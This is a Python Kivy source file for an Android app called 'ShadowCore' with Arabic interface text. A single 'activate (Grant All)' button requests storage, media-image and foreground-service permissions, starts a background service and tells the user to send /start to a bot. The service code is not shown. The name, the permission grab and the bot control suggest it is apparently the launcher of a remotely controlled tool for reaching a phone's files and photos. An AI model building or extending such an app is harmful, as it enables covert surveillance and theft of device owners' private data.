from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from jnius import autoclass
from android.permissions import request_permissions, Permission

class ShadowCoreApp(App):
    def build(self):
        # قفل الشاشة بوضع Portrait
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        ActivityInfo = autoclass('android.content.pm.ActivityInfo')
        activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT)

        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        self.status = Label(text="النظام جاهز للعمل", font_size='18sp', halign='center')
        self.btn = Button(text="تفعيل النظام (Grant All)", background_color=(0.1, 0.6, 0.9, 1), font_size='20sp')
        self.btn.bind(on_press=self.start_process)
        
        layout.add_widget(self.status)
        layout.add_widget(self.btn)
        return layout

    def start_process(self, instance):
        # طلب الصلاحيات الشاملة لأندرويد 13
        perms = [
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_MEDIA_IMAGES,
            Permission.FOREGROUND_SERVICE
        ]
        request_permissions(perms, self.launch_service)

    def launch_service(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            service = autoclass('org.test.shadowcore.ServiceMyservice')
            service.start(PythonActivity.mActivity, "")
            self.status.text = "✅ النظام نشط!\nأرسل /start للبوت الآن"
            self.btn.disabled = True
        except Exception as e:
            self.status.text = f"خطأ: {str(e)}"

if __name__ == '__main__':
    ShadowCoreApp().run()
